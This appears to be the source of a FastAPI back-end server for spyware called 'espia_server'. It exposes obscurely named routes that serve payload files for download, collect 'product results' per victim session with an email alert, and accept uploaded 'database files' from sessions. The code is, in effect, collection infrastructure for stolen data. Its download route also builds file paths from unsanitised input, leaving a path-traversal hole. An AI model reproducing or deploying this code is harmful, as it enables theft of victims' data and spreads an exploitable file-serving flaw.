import os
import pathlib
from fastapi import FastAPI, File, UploadFile, Request
from starlette.responses import FileResponse
from espia_server.app.plugins.mails.mail_handler import send_mail
from espia_server.app.utils import handle_products_results, handle_new_uploaded_file, create_new_client_dir, block, \
    title

# In production we don't want any docs served
if os.getenv("ESPIA_ENV") == 'prod':
    print(block + "[+] Running in production env")
    app = FastAPI(docs_url=None, redoc_url=None)
else:
    app = FastAPI()


@app.get("/")
def root_path() -> dict:
    return {}


@app.get("/bahaha/{file}")
def download_file(file: str):
    static_files_path = f'{pathlib.Path(__file__).parent}/static_files'
    return FileResponse(path=f'{static_files_path}/{file}', media_type='application/octet-stream', filename=file)


@app.post("/zn1123n/asnndj")
def upload_results(results: dict) -> dict:
    session_id = results.get('Session-ID')
    create_new_client_dir(session_id)
    handle_products_results(session_id, results)
    print(block + f"[+] Successfully retrieved product session {session_id}")
    send_mail(session_id)
    return {}


@app.post("/zn1123n/asnndj/bbcsgq")
async def create_upload_file(request: Request, fileUpload: UploadFile = File(...)) -> dict:
    session_id = request.headers.get('Session')
    file_path = handle_new_uploaded_file(session_id, fileUpload.filename)
    file_path.write_bytes(await fileUpload.read())

    print(block + f"[+] Successfully received database files from {session_id}")
    return {}